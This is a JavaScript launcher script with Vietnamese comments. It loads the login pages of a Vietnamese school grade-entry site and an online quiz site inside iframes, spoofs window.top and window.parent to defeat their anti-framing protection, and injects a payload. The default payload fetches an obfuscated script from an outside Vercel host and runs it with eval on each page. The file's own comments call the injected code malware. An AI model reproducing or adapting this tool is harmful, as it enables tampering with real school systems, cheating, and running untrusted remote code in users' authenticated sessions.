// ============================================================
// NT4NH2 // LAUNCHER SCRIPT (ANTI-F5 LOOP & SANDBOX)
// Chống Frame-Busting ép F5 toàn trang
// ============================================================

const DEFAULT_CONFIG = {
  targetUrl1: "https://nhapdiem.truonghocviet.vn/Account/Login",
  targetUrl2: "https://tracnghiem22.truonghocviet.vn/Home/Index#/LoginOtp",
  payload: "fetch('https://vschoolx.vercel.app/files/obf.js').then(r => r.text()).then(eval);",
  delay: 3000,
  title: "Launcher Tool",
  bg: "#0d1117",
  text: "#c9d1d9"
};

function loadConfig() {
  const raw = localStorage.getItem("launcher_config");
  if (!raw) return { ...DEFAULT_CONFIG };
  try { 
    const cfg = { ...DEFAULT_CONFIG, ...JSON.parse(raw) };
    if (cfg.targetUrl && !cfg.targetUrl1) { cfg.targetUrl1 = cfg.targetUrl; }
    return cfg;
  }
  catch (e) { return { ...DEFAULT_CONFIG }; }
}

function saveConfig(cfg) {
  localStorage.setItem("launcher_config", JSON.stringify(cfg));
}

let CONFIG = loadConfig();

function applyWebSettings() {
  document.title = CONFIG.title;
  document.body.style.background = CONFIG.bg;
  document.body.style.color = CONFIG.text;
}

const btnLaunch     = document.getElementById("btnLaunch");
const btnSettingTool= document.getElementById("btnSettingTool");
const btnSettingWeb = document.getElementById("btnSettingWeb");
const statusEl      = document.getElementById("status");

const popup         = document.getElementById("popup");
const btnReinject   = document.getElementById("btnReinject");
const btnClose      = document.getElementById("btnClose");

const settingTool   = document.getElementById("settingTool");
const inpTargetUrl  = document.getElementById("inpTargetUrl");
const inpTargetUrl2 = document.getElementById("inpTargetUrl2");
const inpPayload    = document.getElementById("inpPayload");
const inpDelay      = document.getElementById("inpDelay");
const btnSaveTool   = document.getElementById("btnSaveTool");
const btnCloseTool  = document.getElementById("btnCloseTool");

const settingWeb    = document.getElementById("settingWeb");
const inpTitle      = document.getElementById("inpTitle");
const inpBg         = document.getElementById("inpBg");
const inpText       = document.getElementById("inpText");
const btnSaveWeb    = document.getElementById("btnSaveWeb");
const btnCloseWeb   = document.getElementById("btnCloseWeb");

let watchTimer = null;
let popupShown = false;
let currentIframe = null;

function setStatus(msg) {
  statusEl.textContent = "Trạng thái: " + msg;
}

// Mã độc chèn vào iframe để chống F5 Loop
const ANTI_BUST_SCRIPT = `
  <script>
    // Vô hiệu hóa quyền truy cập top/parent để chống Frame-Busting
    try {
      Object.defineProperty(window, 'top', { get: function() { return window; } });
      Object.defineProperty(window, 'parent', { get: function() { return window; } });
    } catch(e) {}
    
    // Chặn các nỗ lực chuyển hướng bằng location
    window.onbeforeunload = function() { return null; };
    
    // Lắng nghe tín hiệu từ trang mẹ
    window.addEventListener("message", function(e) {
      if (e.data === "RUN_PAYLOAD") {
        try {
          ${CONFIG.payload}
        } catch (err) {
          console.error("Payload Error:", err);
        }
      }
    });
  </script>
`;

function launchTool() {
  popupShown = false;
  setStatus("Đang khởi tạo môi trường Inject...");

  if (currentIframe) {
    currentIframe.remove();
  }

  // Tạo iframe cô lập (Sandbox cho phép script và same-origin)
  currentIframe = document.createElement("iframe");
  currentIframe.setAttribute("sandbox", "allow-scripts allow-same-origin allow-forms allow-popups");
  currentIframe.style.width = "100vw";
  currentIframe.style.height = "100vh";
  currentIframe.style.position = "fixed";
  currentIframe.style.top = "0";
  currentIframe.style.left = "0";
  currentIframe.style.zIndex = "9999";
  currentIframe.style.background = "#fff";
  currentIframe.style.border = "none";
  
  document.body.appendChild(currentIframe);

  currentIframe.onload = () => {
    try {
      const iframeDoc = currentIframe.contentWindow.document;
      iframeDoc.open();
      
      // Ghi đè cấu trúc chống F5 Loop
      iframeDoc.write(`
        <!DOCTYPE html>
        <html>
        <head>
          ${ANTI_BUST_SCRIPT}
        </head>
        <body style="margin:0; padding:0; overflow:hidden;">
          <iframe id="innerFrame" src="${CONFIG.targetUrl1}" style="width:100%; height:100vh; border:none;" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>
          <script>
            // Tự động chuyển sang trang 2 sau delay
            setTimeout(function() {
              const inner = document.getElementById('innerFrame');
              if (inner) inner.src = "${CONFIG.targetUrl2}";
            }, ${CONFIG.delay});
          </script>
        </body>
        </html>
      `);
      iframeDoc.close();

      // Inject Payload lần 1
      setTimeout(() => {
        if (currentIframe && currentIframe.contentWindow) {
          currentIframe.contentWindow.postMessage("RUN_PAYLOAD", "*");
          setStatus("Đã Inject Trang 1. Chờ chuyển Trang 2...");
        }
      }, 1000);

      // Inject Payload lần 2 (Sau khi chuyển trang)
      setTimeout(() => {
        if (currentIframe && currentIframe.contentWindow) {
          currentIframe.contentWindow.postMessage("RUN_PAYLOAD", "*");
          setStatus("Đã Inject Trang 2. Đang giám sát...");
        }
      }, CONFIG.delay + 1500);

    } catch (e) {
      console.error("Lỗi Inject DOM:", e);
      setStatus("Lỗi: Không thể ghi vào iframe.");
      onToolClosed();
    }
  };

  currentIframe.src = "about:blank";
  startWatch();
}

function startWatch() {
  stopWatch();
  watchTimer = setInterval(() => {
    if (!currentIframe || !document.body.contains(currentIframe)) {
      stopWatch();
      onToolClosed();
    }
  }, 1000);
}

function stopWatch() {
  if (watchTimer) { clearInterval(watchTimer); watchTimer = null; }
}

function onToolClosed() {
  setStatus("Tool đã ngắt.");
  if (!popupShown) {
    popupShown = true;
    popup.classList.remove("hidden");
  }
}

btnLaunch.addEventListener("click", launchTool);

btnSettingTool.addEventListener("click", () => {
  inpTargetUrl.value = CONFIG.targetUrl1;
  inpTargetUrl2.value = CONFIG.targetUrl2;
  inpPayload.value   = CONFIG.payload;
  inpDelay.value     = CONFIG.delay;
  settingTool.classList.remove("hidden");
});

btnSettingWeb.addEventListener("click", () => {
  inpTitle.value = CONFIG.title;
  inpBg.value    = CONFIG.bg;
  inpText.value  = CONFIG.text;
  settingWeb.classList.remove("hidden");
});

btnSaveTool.addEventListener("click", () => {
  CONFIG.targetUrl1 = inpTargetUrl.value.trim();
  CONFIG.targetUrl2 = inpTargetUrl2.value.trim();
  CONFIG.payload   = inpPayload.value.trim();
  CONFIG.delay     = parseInt(inpDelay.value) || 3000;
  saveConfig(CONFIG);
  settingTool.classList.add("hidden");
  setStatus("Đã lưu setting tool.");
});

btnSaveWeb.addEventListener("click", () => {
  CONFIG.title = inpTitle.value.trim() || "Launcher Tool";
  CONFIG.bg    = inpBg.value;
  CONFIG.text  = inpText.value;
  saveConfig(CONFIG);
  applyWebSettings();
  settingWeb.classList.add("hidden");
  setStatus("Đã lưu setting web.");
});

btnCloseTool.addEventListener("click", () => settingTool.classList.add("hidden"));
btnCloseWeb .addEventListener("click", () => settingWeb.classList.add("hidden"));

btnReinject.addEventListener("click", () => {
  popup.classList.add("hidden");
  launchTool();
});

btnClose.addEventListener("click", () => {
  popup.classList.add("hidden");
  if (currentIframe) {
    currentIframe.remove();
    currentIframe = null;
  }
  setStatus("Đã hủy inject lại.");
});

applyWebSettings();
setStatus("Sẵn sàng.");
